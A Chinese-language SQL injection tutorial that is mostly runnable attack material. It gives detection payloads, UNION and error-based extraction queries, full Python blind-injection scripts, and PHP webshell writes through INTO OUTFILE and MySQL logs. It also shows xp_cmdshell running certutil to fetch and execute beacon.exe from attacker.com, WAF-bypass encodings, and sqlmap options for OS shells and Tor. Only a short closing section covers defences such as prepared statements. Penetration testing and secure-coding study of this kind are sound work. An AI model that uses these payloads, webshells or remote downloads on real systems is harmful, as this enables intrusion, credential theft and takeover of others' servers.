# SQL 注入从入门到绕过：实战笔记

---

## 📋 目录

1. [SQL 注入原理](#一sql-注入原理)
2. [注入点探测技术](#二注入点探测)
3. [Union 联合查询注入](#三union-注入)
4. [Boolean 盲注](#四boolean-盲注)
5. [时间盲注](#五时间盲注)
6. [报错注入](#六报错注入)
7. [二次注入与堆叠注入](#七二次注入与堆叠注入)
8. [读写文件与GetShell](#八读写文件与getshell)
9. [WAF 绕过技术大全](#九waf-绕过)
10. [sqlmap 高级用法](#十sqlmap-高级)
11. [不同数据库注入差异](#十一不同数据库)
12. [完整案例：电商网站SQL注入](#十二完整案例)
13. [防御方案](#十三防御方案)
14. [排错指南](#十四排错指南)

---

## 一、SQL 注入原理

### 1.1 漏洞本质

```php
// ❌ 不安全的后端代码
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);
// 如果 id=1 UNION SELECT user(),version(),3 -- -
// 实际执行的 SQL:
// SELECT * FROM products WHERE id = 1 UNION SELECT user(),version(),3 -- -
```

```
SQL 注入 = 用户输入被当作 SQL 代码执行

关键是代码（Code）和 数据（Data）的边界被打破：
  原本：SELECT * FROM products WHERE id = [数据]
  注入后：SELECT * FROM products WHERE id = [数据 + 代码]
```

### 1.2 注入分类

```
按回显方式：
  ✦ Union 注入（有回显）——页面直接显示查询结果
  ✦ 报错注入（有报错）——数据库错误信息泄露
  ✦ Boolean 盲注（无回显）——通过真假条件判断
  ✦ 时间盲注（无回显）——通过响应时间判断
  ✦ OOB（带外注入）——通过 DNS/HTTP 外带数据

按位置：
  ✦ GET/POST 参数注入
  ✦ Cookie 注入
  ✦ HTTP Header 注入（User-Agent / Referer / X-Forwarded-For）
  ✦ JSON/XML 注入
```

---

## 二、注入点探测

### 2.1 手工探测

```sql
-- ===== 方法1: 单引号测试 =====
?id=1'      → 报错 → 注入点！
?id=1''     → 正常 → 注入点！（双引号闭合）
?id=1       → 正常

-- ===== 方法2: 逻辑测试 =====
?id=1 AND 1=1   → 正常
?id=1 AND 1=2   → 异常 → 注入点！
?id=1 OR 1=1    → 返回所有数据 → 注入点！

-- ===== 方法3: 算术测试 =====
?id=2-1      → 返回 id=1 的数据 → 注入点！
?id=1*2      → 返回 id=2 的数据 → 注入点！

-- ===== 方法4: 注释符测试 =====
?id=1 -- -   → 正常
?id=1' -- -  → 正常 → 注入点！（单引号被注释闭合）
?id=1' #     → 正常 → MySQL 注入点！

-- ===== 方法5: 延时测试（无回显时）=====
?id=1 AND SLEEP(5)    → 延迟5秒 → MySQL 注入点
?id=1 WAITFOR DELAY '0:0:5' → 延迟5秒 → SQL Server 注入点
?id=1 AND pg_sleep(5) → 延迟5秒 → PostgreSQL 注入点
```

### 2.2 常用注释符

```sql
-- MySQL:
#       单行注释（需要空格在#后）
--      单行注释（需要空格在--后）
/* */   多行注释

-- SQL Server:
--      单行注释
/* */   多行注释

-- PostgreSQL:
--      单行注释
/* */   多行注释

-- Oracle:
--      单行注释
/* */   多行注释
```

---

## 三、Union 注入

### 3.1 基础 Union

```sql
-- ===== Step 1: 确定列数 =====
?id=1 ORDER BY 1 -- -    → 正常
?id=1 ORDER BY 2 -- -    → 正常
?id=1 ORDER BY 3 -- -    → 正常
?id=1 ORDER BY 4 -- -    → 报错 → 共3列
-- 或使用:
?id=1 UNION SELECT NULL,NULL,NULL -- -

-- ===== Step 2: 确定回显列 =====
?id=-1 UNION SELECT 1,2,3 -- -
-- 页面显示 2 和 3 → 第2、3列可回显
-- 注意: id 使用负值(-1)使原始查询为空，方便显示union结果

-- ===== Step 3: 获取数据库信息 =====
?id=-1 UNION SELECT 1,database(),version() -- -
-- 输出: db_shop, 5.7.38

?id=-1 UNION SELECT 1,user(),@@datadir -- -
-- 输出: root@localhost, /var/lib/mysql/

-- ===== Step 4: 获取表名 =====
?id=-1 UNION SELECT 1,group_concat(table_name),3 
  FROM information_schema.tables 
  WHERE table_schema=database() -- -
-- 输出: products,users,orders,admin_logs...

-- ===== Step 5: 获取列名 =====
?id=-1 UNION SELECT 1,group_concat(column_name),3 
  FROM information_schema.columns 
  WHERE table_name='users' AND table_schema=database() -- -
-- 输出: id,username,password,email,phone,role...

-- ===== Step 6: 获取数据 =====
?id=-1 UNION SELECT 1,
  group_concat(username,':',password,':',email,'<br>'),3 
  FROM users -- -
```

### 3.2 限制回显行数时的绕过

```sql
-- 如果页面只显示一行，用 LIMIT 逐行读取
?id=-1 UNION SELECT 1,concat(username,':',password),3 
  FROM users LIMIT 0,1 -- -
?id=-1 UNION SELECT 1,concat(username,':',password),3 
  FROM users LIMIT 1,1 -- -
?id=-1 UNION SELECT 1,concat(username,':',password),3 
  FROM users LIMIT 2,1 -- -

-- 或使用 group_concat 拼接
?id=-1 UNION SELECT 1,
  group_concat(username,0x3a,password SEPARATOR '<br>'),3 
  FROM users -- -
-- 0x3a = 冒号的十六进制，避免引号被过滤
```

---

## 四、Boolean 盲注

### 4.1 原理

```
Boolean 盲注：通过页面返回"真"或"假"来判断

正常页面返回 "Product Found"（产品存在）
?id=1 AND 1=2 → 返回 "Product Found"？还是 "Not Found"？
如果返回变了 → 可以盲注
```

### 4.2 完整爆破脚本

```python
#!/usr/bin/env python3
"""
Boolean 盲注自动化脚本
适用场景：页面通过两种不同响应区分真/假条件
"""

import requests
import string

TARGET = "https://xxx.com/product.php"
CHARSET = string.ascii_lowercase + string.digits + "_-@."

def check_condition(payload):
    """发送带条件的请求，返回 True/False"""
    resp = requests.get(
        TARGET,
        params={"id": f"1 AND ({payload})"},
        headers={"User-Agent": "Mozilla/5.0"}
    )
    # 根据页面特征判断真/假
    # "Product Found" = True, "Not Found" = False
    return "Product Found" in resp.text

def get_database_name():
    """爆破数据库名"""
    print("[*] 爆破数据库名...")
    db_name = ""
    
    # 先获取长度
    db_len = 0
    for i in range(1, 50):
        if check_condition(f"LENGTH(database())={i}"):
            db_len = i
            print(f"[+] 数据库名长度: {db_len}")
            break
    
    # 逐字符爆破
    for pos in range(1, db_len + 1):
        for c in CHARSET:
            ascii_val = ord(c)
            if check_condition(
                f"ASCII(SUBSTRING(database(),{pos},1))={ascii_val}"
            ):
                db_name += c
                print(f"[+] 第{pos}位: {c} → {db_name}")
                break
    
    return db_name

def get_table_names(db_name):
    """爆破表名"""
    print("[*] 爆破表名...")
    tables = []
    
    # 先爆破表数量
    table_count = 0
    for i in range(1, 50):
        payload = (
            f"(SELECT COUNT(*) FROM information_schema.tables "
            f"WHERE table_schema='{db_name}')={i}"
        )
        if check_condition(payload):
            table_count = i
            print(f"[+] 表数量: {table_count}")
            break
    
    # 逐表爆破表名
    for idx in range(table_count):
        table_name = ""
        # 先获取表名长度
        t_len = 0
        for l in range(1, 50):
            if check_condition(
                f"(SELECT LENGTH(table_name) FROM "
                f"information_schema.tables WHERE "
                f"table_schema='{db_name}' LIMIT {idx},1)={l}"
            ):
                t_len = l
                break
        
        # 逐字符爆破
        for pos in range(1, t_len + 1):
            for c in CHARSET:
                if check_condition(
                    f"(SELECT ASCII(SUBSTRING(table_name,{pos},1)) "
                    f"FROM information_schema.tables WHERE "
                    f"table_schema='{db_name}' LIMIT {idx},1)={ord(c)}"
                ):
                    table_name += c
                    break
        
        tables.append(table_name)
        print(f"[+] 表 {idx+1}: {table_name}")
    
    return tables

def get_column_names(db_name, table_name):
    """爆破列名"""
    columns = []
    idx = 0
    while True:
        col_name = ""
        try:
            for pos in range(1, 30):
                found = False
                for c in CHARSET:
                    if check_condition(
                        f"(SELECT ASCII(SUBSTRING(column_name,{pos},1)) "
                        f"FROM information_schema.columns WHERE "
                        f"table_schema='{db_name}' AND "
                        f"table_name='{table_name}' LIMIT {idx},1)={ord(c)}"
                    ):
                        col_name += c
                        found = True
                        break
                if not found:
                    break
            if col_name:
                columns.append(col_name)
                idx += 1
            else:
                break
        except:
            break
    return columns

# 主流程
if __name__ == "__main__":
    db = get_database_name()
    print(f"\n[数据库] {db}")
    
    tables = get_table_names(db)
    
    for table in tables:
        cols = get_column_names(db, table)
        print(f"\n[表] {table}")
        for col in cols:
            print(f"  - {col}")
```

---

## 五、时间盲注

### 5.1 原理

```
当没有任何回显差异时，通过响应时间来判断

真条件 → SLEEP(3) → 延迟3秒
假条件 → 不延迟 → 立即返回
```

### 5.2 时间盲注脚本

```python
#!/usr/bin/env python3
"""时间盲注自动化"""

import requests
import time

TARGET = "https://xxx.com/search.php"
SLEEP_SECONDS = 3

def time_check(payload):
    """发送请求，返回响应时间"""
    start = time.time()
    try:
        requests.get(
            TARGET,
            params={"keyword": f"test' AND ({payload}) -- "},
            timeout=SLEEP_SECONDS + 5
        )
    except:
        pass
    return time.time() - start

def is_true(payload):
    """判断条件真假"""
    elapsed = time_check(f"IF({payload},SLEEP({SLEEP_SECONDS}),0)")
    return elapsed >= SLEEP_SECONDS

# MySQL 时间盲注语法:
# IF(条件, SLEEP(3), 0)
# IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(3), 0)

# SQL Server:
# IF(条件) WAITFOR DELAY '0:0:3'

# PostgreSQL:
# SELECT CASE WHEN (条件) THEN pg_sleep(3) END
```

---

## 六、报错注入

### 6.1 MySQL 报错注入

```sql
-- ===== 方法1: extractvalue (最多32字符) =====
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) -- -
-- 报错: XPATH syntax error: '~db_shop~'

?id=1' AND extractvalue(1,concat(0x7e,
  (SELECT group_concat(table_name) FROM information_schema.tables 
   WHERE table_schema=database()),0x7e)) -- -

-- ===== 方法2: updatexml =====
?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) -- -

-- ===== 方法3: floor + rand 报错 =====
?id=1' AND (SELECT 1 FROM (SELECT count(*),concat(
  (SELECT database()),floor(rand(0)*2))x FROM information_schema.tables 
  GROUP BY x)a) -- -
-- 输出: Duplicate entry 'db_shop1' for key...
```

### 6.2 SQL Server 报错注入

```sql
-- 使用 convert 报错
?id=1' AND 1=CONVERT(int, (SELECT @@version)) -- -
-- 输出: Conversion failed when converting varchar value 'Microsoft SQL Server 2019' to data type int

-- 提取多行数据
?id=1' AND 1=CONVERT(int, (
  SELECT TOP 1 name FROM sys.tables FOR XML PATH('')
)) -- -
```

---

## 七、二次注入与堆叠注入

### 7.1 二次注入

```
二次注入：恶意数据先存入数据库，后续被取出时触发

攻击流程：
  ① 注册用户名为 admin' --  的用户
  ② 数据库存储: INSERT INTO users VALUES ('admin'' -- ', ...)
  ③ 修改密码功能:
      UPDATE users SET password='newpass' WHERE username='admin' -- '
      → 实际更新了 admin 的密码！
```

```php
// 漏洞代码：
// 注册时用了 mysqli_real_escape_string（正确）
$username = mysqli_real_escape_string($conn, $_POST['username']);
$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
// → 数据库存储: admin' --

// 修改密码时没用预处理（错误！）
$username = $_SESSION['username'];  // 从数据库取出: admin' --
$sql = "UPDATE users SET password='$newpass' WHERE username='$username'";
// → 拼接 SQL: WHERE username='admin' -- '   ← 注入了！
```

### 7.2 堆叠注入

```sql
-- 堆叠注入（多条 SQL 语句一起执行）
-- 前提：后端使用 mysqli_multi_query() 或多语句支持

-- MySQL:
?id=1'; INSERT INTO users(username,password) VALUES('hacker','p@ssw0rd') -- -
?id=1'; DROP TABLE users -- -

-- SQL Server:
?id=1'; EXEC master..xp_cmdshell 'whoami' -- -
-- ⚠️ xp_cmdshell 默认禁用，需先启用:
-- EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## 八、读写文件与 GetShell

### 8.1 MySQL 读写文件

```sql
-- === 前提条件 ===
-- 1. MySQL 用户有 FILE 权限
--    SELECT file_priv FROM mysql.user WHERE user='root';
-- 2. secure_file_priv 允许
--    SHOW VARIABLES LIKE 'secure_file_priv';
--    NULL = 禁止; 空 = 任意; /path = 仅该目录

-- ===== 读文件 =====
?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -
?id=-1 UNION SELECT 1,LOAD_FILE('C:/Windows/win.ini'),3 -- -
?id=-1 UNION SELECT 1,
  LOAD_FILE('/var/www/html/config.php'),3 -- -

-- 如果被过滤，用十六进制绕过：
?id=-1 UNION SELECT 1,
  LOAD_FILE(0x2F6574632F706173737764),3 -- -
-- 0x2F6574632F706173737764 = '/etc/passwd'

-- ===== 写文件（写 WebShell） =====
?id=-1 UNION SELECT 1,
  '<?php @eval($_POST[cmd]);?>',
  3 INTO OUTFILE '/var/www/html/shell.php' -- -

-- 十六进制写入:
?id=-1 UNION SELECT 1,
  0x3C3F70687020406576616C28245F504F53545B636D645D293B3F3E,
  3 INTO OUTFILE '/var/www/html/shell.php' -- -

-- ===== 日志写 Shell（当 secure_file_priv 禁止 OUTFILE 时）=====
-- 1. 开启 general_log
SET GLOBAL general_log = 'ON';
-- 2. 修改日志路径到 Web 目录
SET GLOBAL general_log_file = '/var/www/html/log.php';
-- 3. 执行含恶意代码的查询
SELECT '<?php @eval($_POST[cmd]);?>';
-- → 代码写入日志文件 → 访问 log.php = 执行代码

-- ===== 慢查询日志写 Shell =====
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/var/www/html/slow.php';
SELECT '<?php @eval($_POST[cmd]);?>' AND SLEEP(10);
```

### 8.2 SQL Server 执行命令

```sql
-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/beacon.exe C:\Windows\Temp\b.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\b.exe';
```

---

## 九、WAF 绕过

### 9.1 关键字绕过

```sql
-- ===== 大小写混合 =====
SeLeCt * FrOm users WhErE id=1

-- ===== 双写绕过 =====
SELSELECTECT → 过滤掉 SELECT → 还原为 SELECT
UNUNIONION SELECT → 过滤掉 UNION → 还原为 UNION SELECT

-- ===== 注释混淆 =====
SELECT/**/user,password/**/FROM/**/users
UN/**/ION/**/SE/**/LECT/**/1,2,3

-- ===== 内联注释 =====
/*!50000SELECT*/ user FROM users
-- MySQL 特性：版本号内联注释
-- /*!XXXXX*/  = 当MySQL版本>=XXXXX时执行
-- /*!50000SELECT*/ = MySQL >= 5.0 时执行 SELECT

-- ===== 等价替换 =====
-- AND → &&
SELECT * FROM users WHERE id=1 && 1=1

-- OR → ||
SELECT * FROM users WHERE id=1 || 1=1

-- 空格替换：
-- 空格 → /**/ (注释)
-- 空格 → %09 (Tab)
-- 空格 → %0a (换行)
-- 空格 → %0d (回车)
-- 空格 → %0b (垂直Tab)
-- 空格 → (括号)
SELECT(user),(password)FROM(users)WHERE(id)=1

-- 等号替换：
-- = → LIKE
SELECT * FROM users WHERE id LIKE 1

-- = → BETWEEN
SELECT * FROM users WHERE id BETWEEN 1 AND 1

-- = → REGEXP
SELECT * FROM users WHERE id REGEXP '^1$'
```

### 9.2 sqlmap tamper 脚本组合

```bash
# WAF 绕过专用组合
sqlmap -u "https://xxx.com/page.php?id=1" \
  --tamper=space2comment,charencode,randomcase,greatest,equaltolike \
  --random-agent \
  --delay=2 \
  --threads=1 \
  --batch

# 常用 tamper 说明:
# space2comment    — 空格替换为 /**/
# charencode       — URL 全编码
# randomcase       — 随机大小写
# charunicodeencode— Unicode 编码
# percentage       — 每个字符前加 %（如 SELECT → %S%E%L%E%C%T）
# equaltolike      — = 替换为 LIKE
# greatest         — > 替换为 GREATEST
# between          — > < 替换为 BETWEEN
# apostrophemask   — ' 替换为 UTF-8 编码
# modsecurityversioned — 内联注释绕过 ModSecurity
# substr2substring — SUBSTR 替换为 SUBSTRING
```

---

## 十、sqlmap 高级

```bash
# ===== 基础用法 =====
sqlmap -u "https://xxx.com/page.php?id=1" --batch

# ===== 指定注入技术 =====
sqlmap -u "https://xxx.com/page.php?id=1" \
  --technique=BEUSTQ
# B: Boolean盲注  E: 报错注入  U: Union注入
# S: 堆叠注入  T: 时间盲注  Q: 内联查询

# ===== POST 请求注入 =====
sqlmap -u "https://xxx.com/login.php" \
  --data="username=admin&password=123" \
  -p username

# ===== 带 Cookie 注入 =====
sqlmap -u "https://xxx.com/dashboard.php" \
  --cookie="PHPSESSID=abc123; token=xyz789"

# ===== 从 Burp 请求文件注入 =====
sqlmap -r burp_request.txt

# ===== 指定数据库类型 =====
sqlmap -u "..." --dbms=mysql
sqlmap -u "..." --dbms=mssql
sqlmap -u "..." --dbms=postgresql

# ===== 数据提取 =====
sqlmap -u "..." --dbs            # 列出数据库
sqlmap -u "..." -D db_name --tables  # 列出表
sqlmap -u "..." -D db_name -T users --columns  # 列出列
sqlmap -u "..." -D db_name -T users --dump  # 导出数据
sqlmap -u "..." -D db_name -T users -C username,password --dump  # 导出指定列

# ===== 文件操作 =====
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# ===== 提权 =====
sqlmap -u "..." --os-shell    # 获取操作系统 Shell
sqlmap -u "..." --os-pwn      # 获取 Meterpreter
sqlmap -u "..." --sql-shell   # 获取 SQL Shell

# ===== 代理与高级选项 =====
sqlmap -u "..." --proxy="http://127.0.0.1:8080"  # 通过 Burp 代理
sqlmap -u "..." --tor --tor-type=SOCKS5          # 通过 Tor 匿名
sqlmap -u "..." --random-agent                    # 随机 User-Agent
sqlmap -u "..." --delay=2 --timeout=10           # 延迟和超时
```

---

## 十一、不同数据库

| 操作 | MySQL | SQL Server | PostgreSQL | Oracle |
|------|-------|-----------|------------|--------|
| 数据库版本 | `SELECT @@version` | `SELECT @@version` | `SELECT version()` | `SELECT * FROM v$version` |
| 当前数据库 | `SELECT database()` | `SELECT DB_NAME()` | `SELECT current_database()` | `SELECT name FROM v$database` |
| 所有数据库 | `SHOW DATABASES` | `SELECT name FROM sys.databases` | `SELECT datname FROM pg_database` | `SELECT username FROM dba_users` |
| 所有表 | `SHOW TABLES` | `SELECT name FROM sysobjects WHERE xtype='U'` | `SELECT tablename FROM pg_tables` | `SELECT table_name FROM all_tables` |
| 字符串连接 | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
| 限制行数 | `LIMIT 0,1` | `TOP 1` | `LIMIT 1 OFFSET 0` | `WHERE ROWNUM=1` |
| 注释 | `#` `-- ` `/* */` | `-- ` `/* */` | `-- ` `/* */` | `-- ` `/* */` |
| 时间延迟 | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` |

---

## 十二、完整案例：电商网站 SQL 注入

```
目标：某电商网站 https://shop.xxx.com

Step 1: 发现注入点
  搜索功能: /search.php?keyword=test → 返回搜索结果
  /search.php?keyword=test' → 页面返回"数据库错误"
  → 确认注入点，参数: keyword

Step 2: 确定注入类型
  keyword=test' AND 1=1 --  → 正常
  keyword=test' AND 1=2 --  → 无结果
  → Boolean 盲注

Step 3: 获取数据库信息
  数据库名: eshop_prod
  数据库类型: MySQL 5.7

Step 4: 获取表结构
  表名: users, products, orders, payments, admin_users

Step 5: 提取敏感数据
  admin_users 表:
    admin/5f4dcc3b5aa765d61d8327deb882cf99 (md5 → password)
  users 表: 3.2万条用户记录（脱敏后用 hashcat 离线破解）

Step 6: 验证危害
  ① 登录后台: admin/password → 成功
  ② 后台有订单管理 → 可查看所有用户订单
  ③ 后台可导出用户数据 → 证明数据泄露风险

漏洞等级: Critical (CVSS 9.8)

修复方案:
  所有 SQL 查询改用 PDO 预处理语句
  $stmt = $pdo->prepare("SELECT * FROM products WHERE keyword LIKE ?");
  $stmt->execute(['%'.$_GET['keyword'].'%']);
```

---

## 十三、防御方案

```php
// ✅ 方案1: PDO 预处理语句（推荐）
$pdo = new PDO('mysql:host=localhost;dbname=shop', 'user', 'pass');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
$result = $stmt->fetchAll();

// ✅ 方案2: mysqli 预处理语句
$stmt = $mysqli->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();

// ✅ 方案3: 输入验证 + 白名单
$allowed_columns = ['id', 'name', 'price', 'created_at'];
if (!in_array($_GET['order_by'], $allowed_columns)) {
    die('Invalid column');
}
// 对于无法使用预处理的场景（如动态 ORDER BY），使用白名单验证

// ❌ 千万别用的过时方案：
// 1. magic_quotes_gpc（PHP 5.4 已移除）
// 2. addslashes() — 无法防御 GBK 宽字节注入
// 3. 黑名单关键词过滤 — 总有绕过方法
```

---

## 十四、排错指南

```
问题1: sqlmap 探测不到注入点
排查:
  ① 是否缺少 Cookie/认证头？
     解决: sqlmap -u "..." --cookie="..." -H "Authorization: Bearer ..."
  ② 参数是在 POST body 里？
     解决: sqlmap -u "..." --data="key=value" -p key
  ③ 参数在 JSON 里？
     解决: 抓 Burp 请求保存为 req.txt → sqlmap -r req.txt
  ④ WAF 拦截？
     解决: --tamper=space2comment,charencode,randomcase --delay=2

问题2: Union 注入不显示数据
排查:
  ① 前面查询返回了行 → 用 -1 或 9999 使前查询为空
  ② 列数不对 → 重新测试列数 (ORDER BY / NULL 填充)
  ③ 数据类型不匹配 → 使用 NULL 填充不兼容的列

问题3: 盲注脚本结果乱码
排查:
  ① 字符集问题 → 确认页面编码 (UTF-8/GBK)
  ② 爆破范围不对 → CHARSET 需要加入特殊字符
  
问题4: OUTFILE 写文件失败
排查:
  ① FILE 权限 → SELECT file_priv FROM mysql.user
  ② secure_file_priv → SHOW VARIABLES LIKE 'secure_file_priv'
  ③ 目录权限 → 确认 MySQL 用户对该目录有写入权限
  ④ 文件已存在 → MySQL 不会覆盖已存在的文件
```

---

## ✅ Checklist

- [ ] 确认注入点（单引号/逻辑/延时测试）
- [ ] 确定数据库类型（MySQL/MSSQL/PostgreSQL/Oracle）
- [ ] 确定注入类型（Union/Boolean/Time/Error）
- [ ] 获取数据库结构和敏感数据
- [ ] 评估影响（能读到什么？能执行什么？）
- [ ] 尝试读写文件（评估危害上限）
- [ ] 记录完整 PoC（截图+Payload）
- [ ] 编写修复方案（预处理语句）
- [ ] 修复后复测（用 sqlmap 验证）
